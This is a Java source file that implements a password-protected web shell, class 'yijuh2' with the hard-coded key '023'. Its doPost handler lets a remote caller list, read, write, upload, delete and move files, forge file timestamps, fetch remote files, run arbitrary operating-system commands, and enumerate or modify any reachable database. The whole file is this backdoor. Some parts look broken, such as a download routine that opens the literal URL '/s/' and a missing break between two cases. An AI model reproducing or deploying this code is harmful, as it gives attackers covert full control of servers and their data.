package com.lenkee.app.testBug;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;

public class yijuh2{

    public static void main(String[] args) {

    }

    public static String getPassword() throws IOException {
        return "023";
    }

    String cs = "UTF-8";

    String encoding(String s) throws Exception {
        return new String(s.getBytes("ISO-8859-1"), cs);
    }

    Connection getConnection(String s) throws Exception {
        String[] x = s.trim().split("\r\n");
        try {
            Class.forName(x[0].trim());
        } catch (ClassNotFoundException e) {
            boolean classNotFound = true;
            BufferedReader br = new BufferedReader(new InputStreamReader(this.getClass().getResourceAsStream("/map.txt")));
            String str = "";
            while ((str = br.readLine()) != null) {
                String[] arr = str.split("=");
                if (arr.length == 2 && arr[0].trim().equals(x[0].trim())) {
                    try {
                        URLClassLoader ucl = (URLClassLoader) ClassLoader.getSystemClassLoader();
                        Method m = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
                        m.setAccessible(true);
                        m.invoke(ucl, new Object[]{new URL(arr[1])});
                        Class.forName(arr[0].trim());
                        classNotFound = false;
                        break;
                    } catch (ClassNotFoundException ex) {
                        throw ex;
                    }
                }
            }
            if (classNotFound) {
                throw e;
            }
        }
        if (x[1].contains("jdbc:oracle")) {
            return DriverManager.getConnection(x[1].trim() + ":" + x[4],
                    x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
                    x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
        } else {
            Connection c = DriverManager.getConnection(x[1].trim(),
                    x[2].equalsIgnoreCase("[/null]") ? "" : x[2],
                    x[3].equalsIgnoreCase("[/null]") ? "" : x[3]);
            if (x.length > 4) {
                c.setCatalog(x[4]);
            }
            return c;
        }
    }

    void listRoots(ByteArrayOutputStream out) throws Exception {
        File r[] = File.listRoots();
        for (File f : r) {
            out.write((f.getName()).getBytes(cs));
        }
    }

    void dir(String s, ByteArrayOutputStream out) throws Exception {
        File l[] = new File(s).listFiles();
        for (File f : l) {
            String mt = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(f.lastModified()));
            String rw = f.canRead() ? "R" : "" + (f.canWrite() ? " W" : "");
            out.write((f.getName() + (f.isDirectory() ? "/" : "") + "\t" + mt + "\t" + f.length() + "\t" + rw + "\n").getBytes(cs));
        }
    }

    void deleteFiles(File f) throws Exception {
        if (f.isDirectory()) {
            File x[] = f.listFiles();
            for (File fs : x) {
                deleteFiles(fs);
            }
        }
        f.delete();
    }

    byte[] readFile(String s) throws Exception {
        int n;
        byte[] b = new byte[1024];
        BufferedInputStream bis = new BufferedInputStream(new FileInputStream(s));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while ((n = bis.read(b)) != -1) {
            bos.write(b, 0, n);
        }
        bis.close();
        return bos.toByteArray();
    }

    void upload(String s, String d) throws Exception {
        String h = "0123456789ABCDEF";
        File f = new File(s);
        f.createNewFile();
        FileOutputStream os = new FileOutputStream(f);
        for (int i = 0; i < d.length(); i += 2) {
            os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
        }
        os.close();
    }

    void filesMove(File sf, File df) throws Exception {
        if (sf.isDirectory()) {
            if (!df.exists()) {
                df.mkdir();
            }
            File z[] = sf.listFiles();
            for (File z1 : z) {
                filesMove(new File(sf, z1.getName()), new File(df, z1.getName()));
            }
        } else {
            FileInputStream is = new FileInputStream(sf);
            FileOutputStream os = new FileOutputStream(df);
            int n;
            byte[] b = new byte[1024];
            while ((n = is.read(b)) != -1) {
                os.write(b, 0, n);
            }
            is.close();
            os.close();
        }
    }

    void fileMove(File s, File d) throws Exception {
        s.renameTo(d);
    }

    void mkdir(File s) throws Exception {
        s.mkdir();
    }

    void setLastModified(File s, String t) throws Exception {
        s.setLastModified(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse(t).getTime());
    }

    void downloadRemoteFile(String s, String d) throws Exception {
        int n = 0;
        FileOutputStream os = new FileOutputStream(d);
        HttpURLConnection h = (HttpURLConnection) new URL("/s/").openConnection();
        InputStream is = h.getInputStream();
        byte[] b = new byte[1024];
        while ((n = is.read(b)) != -1) {
            os.write(b, 0, n);
        }
        os.close();
        is.close();
        h.disconnect();
    }

    void inputStreamToOutPutStream(InputStream is, ByteArrayOutputStream out) throws Exception {
        int i = -1;
        byte[] b = new byte[1024];
        while ((i = is.read(b)) != -1) {
            out.write(b, 0, i);
        }
    }

    void getCurrentDB(String s, ByteArrayOutputStream out) throws Exception {
        Connection c = getConnection(s);
        ResultSet r = s.contains("jdbc:oracle") ? c.getMetaData().getSchemas() : c.getMetaData().getCatalogs();
        while (r.next()) {
            out.write((r.getObject(1) + "\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void getTableName(String s, ByteArrayOutputStream out) throws Exception {
        Connection c = getConnection(s);
        String[] x = s.trim().split("\r\n");
        ResultSet r = c.getMetaData().getTables(null, s.contains("jdbc:oracle") ? x.length > 5 ? x[5] : x[4] : null, "%", new String[]{"TABLE"});
        while (r.next()) {
            out.write((r.getObject("TABLE_NAME") + "\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void getTableColumn(String s, ByteArrayOutputStream out) throws Exception {
        String[] x = s.trim().split("\r\n");
        Connection c = getConnection(s);
        ResultSet r = c.prepareStatement("select * from " + x[x.length - 1]).executeQuery();
        ResultSetMetaData d = r.getMetaData();
        for (int i = 1; i <= d.getColumnCount(); i++) {
            out.write((d.getColumnName(i) + " (" + d.getColumnTypeName(i) + ")\t").getBytes(cs));
        }
        r.close();
        c.close();
    }

    void executeQuery(String cs, String s, String q, ByteArrayOutputStream out, String p) throws Exception {
        Connection c = getConnection(s);
        Statement m = c.createStatement(1005, 1008);
        BufferedWriter bw = null;
        try {
            boolean f = q.contains("--f:");
            ResultSet r = m.executeQuery(f ? q.substring(0, q.indexOf("--f:")) : q);
            ResultSetMetaData d = r.getMetaData();
            int n = d.getColumnCount();
            for (int i = 1; i <= n; i++) {
                out.write((d.getColumnName(i) + "\t|\t").getBytes(cs));
            }
            out.write(("\r\n").getBytes(cs));
            if (f) {
                File file = new File(p);
                if (!q.contains("-to:")) {
                    file.mkdir();
                }
                bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.contains("-to:") ? p.trim() : p + q.substring(q.indexOf("--f:") + 4, q.length()).trim()), true), cs));
            }
            while (r.next()) {
                for (int i = 1; i <= n; i++) {
                    if (f) {
                        bw.write(r.getObject(i) + "" + "\t");
                        bw.flush();
                    } else {
                        out.write((r.getObject(i) + "" + "\t|\t").getBytes(cs));
                    }
                }
                if (bw != null) {
                    bw.newLine();
                }
                out.write(("\r\n").getBytes(cs));
            }
            r.close();
            if (bw != null) {
                bw.close();
            }
        } catch (Exception e) {
            out.write(("Result\t|\t\r\n").getBytes(cs));
            try {
                m.executeUpdate(q);
                out.write(("Execute Successfully!\t|\t\r\n").getBytes(cs));
            } catch (Exception ee) {
                out.write((ee.toString() + "\t|\t\r\n").getBytes(cs));
            }
        }
        m.close();
        c.close();
    }

    public String doPost(Map<String,String>request) throws IOException {
        cs = request.get("z0") != null ? request.get("z0") : cs;
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try {
            char z = (char) request.get(getPassword()).getBytes()[0];
            String z1 = encoding(request.get("z1") + "");
            String z2 = encoding(request.get("z2") + "");
            out.write("->|".getBytes(cs));
            String s = new File("").getCanonicalPath();
            byte[] returnTrue = "1".getBytes(cs);
            switch (z) {
                case 'A':
                    out.write((s + "\t").getBytes(cs));
                    if (!s.substring(0, 1).equals("/")) {
                        listRoots(out);
                    }
                    break;
                case 'B':
                    dir(z1, out);
                    break;
                case 'C':
                    String l = "";
                    BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
                    while ((l = br.readLine()) != null) {
                        out.write((l + "\r\n").getBytes(cs));
                    }
                    br.close();
                    break;
                case 'D':
                    BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
                    bw.write(z2);
                    bw.flush();
                    bw.close();
                    out.write(returnTrue);
                    break;
                case 'E':
                    deleteFiles(new File(z1));
                    out.write("1".getBytes(cs));
                    break;
                case 'F':
                    out.write(readFile(z1));
                case 'G':
                    upload(z1, z2);
                    out.write(returnTrue);
                    break;
                case 'H':
                    filesMove(new File(z1), new File(z2));
                    out.write(returnTrue);
                    break;
                case 'I':
                    fileMove(new File(z1), new File(z2));
                    out.write(returnTrue);
                    break;
                case 'J':
                    mkdir(new File(z1));
                    out.write(returnTrue);
                    break;
                case 'K':
                    setLastModified(new File(z1), z2);
                    out.write(returnTrue);
                    break;
                case 'L':
                    downloadRemoteFile(z1, z2);
                    out.write(returnTrue);
                    break;
                case 'M':
                    String[] c = {z1.substring(2), z1.substring(0, 2), z2};
                    Process p = Runtime.getRuntime().exec(c);
                    inputStreamToOutPutStream(p.getInputStream(), out);
                    inputStreamToOutPutStream(p.getErrorStream(), out);
                    break;
                case 'N':
                    getCurrentDB(z1, out);
                    break;
                case 'O':
                    getTableName(z1, out);
                    break;
                case 'P':
                    getTableColumn(z1, out);
                    break;
                case 'Q':
                    executeQuery(cs, z1, z2, out, z2.contains("-to:") ? z2.substring(z2.indexOf("-to:") + 4, z2.length()) : s.replaceAll("\\\\", "/") + "images/");
                    break;
            }
        } catch (Exception e) {
            out.write(("ERROR" + ":// " + e.toString()).getBytes(cs));
        }
        out.write(("|<-").getBytes(cs));
        return new String(out.toByteArray());
    }

}